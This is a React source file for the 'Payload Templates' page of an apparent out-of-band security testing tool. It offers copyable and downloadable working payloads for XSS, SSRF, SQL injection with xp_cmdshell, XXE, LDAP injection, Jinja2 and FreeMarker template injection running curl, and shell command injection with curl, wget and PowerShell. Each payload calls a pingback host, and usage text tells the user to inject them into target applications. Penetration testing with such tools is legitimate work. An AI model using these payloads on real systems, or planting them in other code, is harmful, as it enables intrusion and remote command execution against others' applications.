"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Badge } from "@/components/ui/badge"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Copy, Download, Shield, AlertTriangle, Bug, Zap, Eye, Database } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Textarea } from "@/components/ui/textarea"

interface PayloadTemplate {
  id: string
  name: string
  category: string
  severity: "low" | "medium" | "high" | "critical"
  description: string
  payload: string
  context: string
  detection: string
  icon: React.ReactNode
}

export default function PayloadTemplates() {
  const [customId, setCustomId] = useState("")
  const [customDomain, setCustomDomain] = useState("")
  const [selectedPayloads, setSelectedPayloads] = useState<string[]>([])

  const baseUrl = typeof window !== "undefined" ? window.location.origin : ""
  const testId = customId || `test-${Date.now()}`
  const domain = customDomain || "your-domain.com"

  const payloadTemplates: PayloadTemplate[] = [
    // XSS Payloads
    {
      id: "xss-img-basic",
      name: "Basic Image XSS",
      category: "xss",
      severity: "high",
      description: "Basic XSS using image tag with error event",
      payload: `<img src="x" onerror="fetch('${baseUrl}/api/pingback?xss=img-basic&id=${testId}')">`,
      context: "HTML injection points, user-generated content",
      detection: "Monitor for requests with xss=img-basic parameter",
      icon: <AlertTriangle className="h-4 w-4" />,
    },
    {
      id: "xss-script-fetch",
      name: "Script Tag with Fetch",
      category: "xss",
      severity: "critical",
      description: "XSS using script tag with fetch API",
      payload: `<script>fetch('${baseUrl}/api/pingback?xss=script-fetch&id=${testId}&data='+document.domain)</script>`,
      context: "Any HTML context allowing script tags",
      detection: "Look for requests containing document.domain data",
      icon: <AlertTriangle className="h-4 w-4" />,
    },
    {
      id: "xss-svg-onload",
      name: "SVG OnLoad XSS",
      category: "xss",
      severity: "high",
      description: "XSS using SVG with onload event",
      payload: `<svg onload="fetch('${baseUrl}/api/pingback?xss=svg-onload&id=${testId}')">`,
      context: "SVG upload or HTML contexts allowing SVG",
      detection: "Monitor for xss=svg-onload in requests",
      icon: <AlertTriangle className="h-4 w-4" />,
    },
    {
      id: "xss-javascript-url",
      name: "JavaScript URL XSS",
      category: "xss",
      severity: "medium",
      description: "XSS using javascript: URL scheme",
      payload: `javascript:fetch('${baseUrl}/api/pingback?xss=js-url&id=${testId}')`,
      context: "href attributes, URL parameters",
      detection: "Check for xss=js-url parameter",
      icon: <AlertTriangle className="h-4 w-4" />,
    },

    // SSRF Payloads
    {
      id: "ssrf-basic-http",
      name: "Basic HTTP SSRF",
      category: "ssrf",
      severity: "high",
      description: "Basic SSRF using HTTP request",
      payload: `${baseUrl}/api/pingback?ssrf=basic-http&id=${testId}`,
      context: "URL parameters, file upload, webhook URLs",
      detection: "Monitor for ssrf=basic-http parameter",
      icon: <Shield className="h-4 w-4" />,
    },
    {
      id: "ssrf-redirect",
      name: "SSRF with Redirect",
      category: "ssrf",
      severity: "high",
      description: "SSRF using redirect to bypass filters",
      payload: `http://httpbin.org/redirect-to?url=${encodeURIComponent(`${baseUrl}/api/pingback?ssrf=redirect&id=${testId}`)}`,
      context: "Applications that follow redirects",
      detection: "Look for ssrf=redirect in requests",
      icon: <Shield className="h-4 w-4" />,
    },
    {
      id: "ssrf-localhost-bypass",
      name: "Localhost Bypass SSRF",
      category: "ssrf",
      severity: "critical",
      description: "SSRF targeting localhost with various bypass techniques",
      payload: `http://127.0.0.1:80/../../${baseUrl.replace("https://", "").replace("http://", "")}/api/pingback?ssrf=localhost&id=${testId}`,
      context: "Internal network access, localhost restrictions",
      detection: "Monitor for ssrf=localhost parameter",
      icon: <Shield className="h-4 w-4" />,
    },

    // Command Injection Payloads
    {
      id: "rce-curl-basic",
      name: "Basic cURL Injection",
      category: "rce",
      severity: "critical",
      description: "Command injection using cURL",
      payload: `; curl "${baseUrl}/api/pingback?rce=curl-basic&id=${testId}" ;`,
      context: "Command line parameters, system() calls",
      detection: "Check for rce=curl-basic in requests",
      icon: <Bug className="h-4 w-4" />,
    },
    {
      id: "rce-wget-injection",
      name: "Wget Command Injection",
      category: "rce",
      severity: "critical",
      description: "Command injection using wget",
      payload: `| wget "${baseUrl}/api/pingback?rce=wget&id=${testId}" -O /dev/null`,
      context: "Shell command execution contexts",
      detection: "Monitor for rce=wget parameter",
      icon: <Bug className="h-4 w-4" />,
    },
    {
      id: "rce-backtick-injection",
      name: "Backtick Command Injection",
      category: "rce",
      severity: "critical",
      description: "Command injection using backticks",
      payload: `\`curl "${baseUrl}/api/pingback?rce=backtick&id=${testId}"\``,
      context: "Shell evaluation contexts",
      detection: "Look for rce=backtick in requests",
      icon: <Bug className="h-4 w-4" />,
    },
    {
      id: "rce-powershell",
      name: "PowerShell Injection",
      category: "rce",
      severity: "critical",
      description: "Command injection for Windows PowerShell",
      payload: `; Invoke-WebRequest -Uri "${baseUrl}/api/pingback?rce=powershell&id=${testId}" ;`,
      context: "Windows environments, PowerShell execution",
      detection: "Monitor for rce=powershell parameter",
      icon: <Bug className="h-4 w-4" />,
    },

    // SQL Injection Payloads
    {
      id: "sqli-time-based",
      name: "Time-Based SQLi",
      category: "sqli",
      severity: "high",
      description: "Time-based SQL injection with HTTP callback",
      payload: `'; WAITFOR DELAY '00:00:05'; EXEC xp_cmdshell 'curl "${baseUrl}/api/pingback?sqli=time-based&id=${testId}"'; --`,
      context: "SQL Server environments with xp_cmdshell",
      detection: "Check for delayed requests with sqli=time-based",
      icon: <Database className="h-4 w-4" />,
    },
    {
      id: "sqli-union-callback",
      name: "UNION-Based SQLi Callback",
      category: "sqli",
      severity: "high",
      description: "UNION-based SQL injection with HTTP callback",
      payload: `' UNION SELECT 1,LOAD_FILE('${baseUrl}/api/pingback?sqli=union&id=${testId}'),3-- `,
      context: "MySQL environments with LOAD_FILE function",
      detection: "Monitor for sqli=union parameter",
      icon: <Database className="h-4 w-4" />,
    },

    // XXE Payloads
    {
      id: "xxe-external-entity",
      name: "External Entity XXE",
      category: "xxe",
      severity: "high",
      description: "XXE using external entity with HTTP callback",
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "${baseUrl}/api/pingback?xxe=external-entity&id=${testId}">
]>
<root>&xxe;</root>`,
      context: "XML parsers, file upload, API endpoints",
      detection: "Look for xxe=external-entity in requests",
      icon: <Eye className="h-4 w-4" />,
    },
    {
      id: "xxe-parameter-entity",
      name: "Parameter Entity XXE",
      category: "xxe",
      severity: "high",
      description: "XXE using parameter entity",
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "${baseUrl}/api/pingback?xxe=parameter&id=${testId}">
%xxe;
]>
<root></root>`,
      context: "XML parsers allowing parameter entities",
      detection: "Monitor for xxe=parameter parameter",
      icon: <Eye className="h-4 w-4" />,
    },

    // LDAP Injection Payloads
    {
      id: "ldap-injection-basic",
      name: "Basic LDAP Injection",
      category: "ldap",
      severity: "medium",
      description: "LDAP injection with HTTP callback",
      payload: `*)(|(objectClass=*))(&(objectClass=user)(description=*${baseUrl}/api/pingback?ldap=basic&id=${testId}*`,
      context: "LDAP authentication, directory services",
      detection: "Check for ldap=basic in requests",
      icon: <Shield className="h-4 w-4" />,
    },

    // Template Injection Payloads
    {
      id: "ssti-jinja2",
      name: "Jinja2 Template Injection",
      category: "ssti",
      severity: "critical",
      description: "Server-side template injection for Jinja2",
      payload: `{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('curl "${baseUrl}/api/pingback?ssti=jinja2&id=${testId}"').read()}}`,
      context: "Python Flask applications using Jinja2",
      detection: "Monitor for ssti=jinja2 parameter",
      icon: <Zap className="h-4 w-4" />,
    },
    {
      id: "ssti-freemarker",
      name: "FreeMarker Template Injection",
      category: "ssti",
      severity: "critical",
      description: "Server-side template injection for FreeMarker",
      payload: `<#assign ex="freemarker.template.utility.Execute"?new()> \${ex("curl '${baseUrl}/api/pingback?ssti=freemarker&id=${testId}'")}`,
      context: "Java applications using FreeMarker",
      detection: "Look for ssti=freemarker in requests",
      icon: <Zap className="h-4 w-4" />,
    },

    // DNS Exfiltration Payloads
    {
      id: "dns-nslookup",
      name: "DNS Lookup Exfiltration",
      category: "dns",
      severity: "medium",
      description: "DNS exfiltration using nslookup",
      payload: `nslookup ${testId}.${domain}`,
      context: "Command execution, DNS resolution",
      detection: "Monitor DNS queries to your domain",
      icon: <Eye className="h-4 w-4" />,
    },
    {
      id: "dns-dig-exfil",
      name: "DNS Dig Exfiltration",
      category: "dns",
      severity: "medium",
      description: "DNS exfiltration using dig command",
      payload: `dig ${testId}.data.${domain}`,
      context: "Unix/Linux environments with dig",
      detection: "Check for DNS queries with data subdomain",
      icon: <Eye className="h-4 w-4" />,
    },
  ]

  const categories = [
    { id: "all", name: "All Payloads", icon: <Shield className="h-4 w-4" /> },
    { id: "xss", name: "XSS", icon: <AlertTriangle className="h-4 w-4" /> },
    { id: "ssrf", name: "SSRF", icon: <Shield className="h-4 w-4" /> },
    { id: "rce", name: "RCE", icon: <Bug className="h-4 w-4" /> },
    { id: "sqli", name: "SQL Injection", icon: <Database className="h-4 w-4" /> },
    { id: "xxe", name: "XXE", icon: <Eye className="h-4 w-4" /> },
    { id: "ssti", name: "SSTI", icon: <Zap className="h-4 w-4" /> },
    { id: "ldap", name: "LDAP", icon: <Shield className="h-4 w-4" /> },
    { id: "dns", name: "DNS", icon: <Eye className="h-4 w-4" /> },
  ]

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical":
        return "destructive"
      case "high":
        return "destructive"
      case "medium":
        return "default"
      case "low":
        return "secondary"
      default:
        return "secondary"
    }
  }

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload)
  }

  const togglePayloadSelection = (payloadId: string) => {
    setSelectedPayloads((prev) =>
      prev.includes(payloadId) ? prev.filter((id) => id !== payloadId) : [...prev, payloadId],
    )
  }

  const downloadSelectedPayloads = () => {
    const selected = payloadTemplates.filter((p) => selectedPayloads.includes(p.id))
    const content = selected
      .map(
        (p) =>
          `# ${p.name} (${p.category.toUpperCase()})\n` +
          `# Severity: ${p.severity.toUpperCase()}\n` +
          `# Description: ${p.description}\n` +
          `# Context: ${p.context}\n` +
          `# Detection: ${p.detection}\n` +
          `${p.payload}\n\n`,
      )
      .join("")

    const blob = new Blob([content], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `payload-templates-${testId}.txt`
    a.click()
    URL.revokeObjectURL(url)
  }

  const downloadAllPayloads = () => {
    const content = payloadTemplates
      .map(
        (p) =>
          `# ${p.name} (${p.category.toUpperCase()})\n` +
          `# Severity: ${p.severity.toUpperCase()}\n` +
          `# Description: ${p.description}\n` +
          `# Context: ${p.context}\n` +
          `# Detection: ${p.detection}\n` +
          `${p.payload}\n\n`,
      )
      .join("")

    const blob = new Blob([content], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `all-payload-templates-${testId}.txt`
    a.click()
    URL.revokeObjectURL(url)
  }

  const filteredPayloads = (category: string) =>
    category === "all" ? payloadTemplates : payloadTemplates.filter((p) => p.category === category)

  return (
    <main className="container mx-auto py-6 px-4 md:px-6">
      <div className="mb-6">
        <h1 className="text-3xl font-bold mb-2">Payload Templates</h1>
        <p className="text-muted-foreground">
          Pre-built payload templates for common vulnerabilities and security testing
        </p>
      </div>

      <div className="grid gap-6">
        {/* Configuration */}
        <Card>
          <CardHeader>
            <CardTitle>Configuration</CardTitle>
            <CardDescription>Customize payload parameters for your testing session</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid gap-4 md:grid-cols-2">
              <div>
                <Label htmlFor="test-id">Test ID</Label>
                <Input
                  id="test-id"
                  placeholder="test-session-123"
                  value={customId}
                  onChange={(e) => setCustomId(e.target.value)}
                />
                <p className="text-xs text-muted-foreground mt-1">Unique identifier for this testing session</p>
              </div>
              <div>
                <Label htmlFor="custom-domain">Custom Domain (for DNS payloads)</Label>
                <Input
                  id="custom-domain"
                  placeholder="your-domain.com"
                  value={customDomain}
                  onChange={(e) => setCustomDomain(e.target.value)}
                />
                <p className="text-xs text-muted-foreground mt-1">Your controlled domain for DNS exfiltration</p>
              </div>
            </div>
            <div className="flex gap-2 mt-4">
              <Button onClick={downloadAllPayloads} variant="outline">
                <Download className="h-4 w-4 mr-2" />
                Download All Templates
              </Button>
              {selectedPayloads.length > 0 && (
                <Button onClick={downloadSelectedPayloads}>
                  <Download className="h-4 w-4 mr-2" />
                  Download Selected ({selectedPayloads.length})
                </Button>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Payload Templates */}
        <Card>
          <CardHeader>
            <CardTitle>Payload Templates</CardTitle>
            <CardDescription>Click on payloads to select them, then copy or download for your testing</CardDescription>
          </CardHeader>
          <CardContent>
            <Tabs defaultValue="all">
              <TabsList className="grid grid-cols-5 lg:grid-cols-9 mb-4">
                {categories.map((category) => (
                  <TabsTrigger key={category.id} value={category.id} className="text-xs">
                    <span className="hidden sm:inline">{category.icon}</span>
                    <span className="ml-1">{category.name}</span>
                  </TabsTrigger>
                ))}
              </TabsList>

              {categories.map((category) => (
                <TabsContent key={category.id} value={category.id}>
                  <ScrollArea className="h-[600px]">
                    <div className="space-y-4">
                      {filteredPayloads(category.id).map((template) => (
                        <Card
                          key={template.id}
                          className={`cursor-pointer transition-colors ${
                            selectedPayloads.includes(template.id) ? "ring-2 ring-primary" : ""
                          }`}
                          onClick={() => togglePayloadSelection(template.id)}
                        >
                          <CardHeader className="pb-3">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-2">
                                {template.icon}
                                <CardTitle className="text-lg">{template.name}</CardTitle>
                                <Badge variant={getSeverityColor(template.severity)}>
                                  {template.severity.toUpperCase()}
                                </Badge>
                                <Badge variant="outline">{template.category.toUpperCase()}</Badge>
                              </div>
                              <Button
                                variant="outline"
                                size="sm"
                                onClick={(e) => {
                                  e.stopPropagation()
                                  copyPayload(template.payload)
                                }}
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                            </div>
                            <CardDescription>{template.description}</CardDescription>
                          </CardHeader>
                          <CardContent>
                            <div className="space-y-3">
                              <div>
                                <Label className="text-sm font-medium">Payload:</Label>
                                <Textarea
                                  value={template.payload}
                                  readOnly
                                  className="mt-1 font-mono text-sm"
                                  rows={template.payload.split("\n").length}
                                />
                              </div>
                              <div className="grid gap-2 md:grid-cols-2">
                                <div>
                                  <Label className="text-sm font-medium">Context:</Label>
                                  <p className="text-sm text-muted-foreground">{template.context}</p>
                                </div>
                                <div>
                                  <Label className="text-sm font-medium">Detection:</Label>
                                  <p className="text-sm text-muted-foreground">{template.detection}</p>
                                </div>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ))}
                    </div>
                  </ScrollArea>
                </TabsContent>
              ))}
            </Tabs>
          </CardContent>
        </Card>

        {/* Usage Instructions */}
        <Alert>
          <Shield className="h-4 w-4" />
          <AlertDescription>
            <strong>Usage Instructions:</strong> Copy payloads and inject them into target applications. Monitor your{" "}
            <a href="/" className="underline">
              main dashboard
            </a>{" "}
            for incoming pingback requests. Each successful payload will generate a request with identifiable parameters
            for easy correlation.
          </AlertDescription>
        </Alert>

        {/* Testing Workflow */}
        <Card>
          <CardHeader>
            <CardTitle>Testing Workflow</CardTitle>
            <CardDescription>Recommended workflow for using these payload templates</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div className="flex items-start gap-3">
                <div className="bg-primary text-primary-foreground rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold">
                  1
                </div>
                <div>
                  <h4 className="font-medium">Configure Test Session</h4>
                  <p className="text-sm text-muted-foreground">Set a unique test ID and configure your domain</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="bg-primary text-primary-foreground rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold">
                  2
                </div>
                <div>
                  <h4 className="font-medium">Select Relevant Payloads</h4>
                  <p className="text-sm text-muted-foreground">
                    Choose payloads based on your target application technology
                  </p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="bg-primary text-primary-foreground rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold">
                  3
                </div>
                <div>
                  <h4 className="font-medium">Deploy Payloads</h4>
                  <p className="text-sm text-muted-foreground">Inject payloads into target application inputs</p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="bg-primary text-primary-foreground rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold">
                  4
                </div>
                <div>
                  <h4 className="font-medium">Monitor Dashboard</h4>
                  <p className="text-sm text-muted-foreground">
                    Watch for incoming requests on your pingback dashboard
                  </p>
                </div>
              </div>
              <div className="flex items-start gap-3">
                <div className="bg-primary text-primary-foreground rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold">
                  5
                </div>
                <div>
                  <h4 className="font-medium">Analyze Results</h4>
                  <p className="text-sm text-muted-foreground">
                    Correlate requests with payloads using test IDs and parameters
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
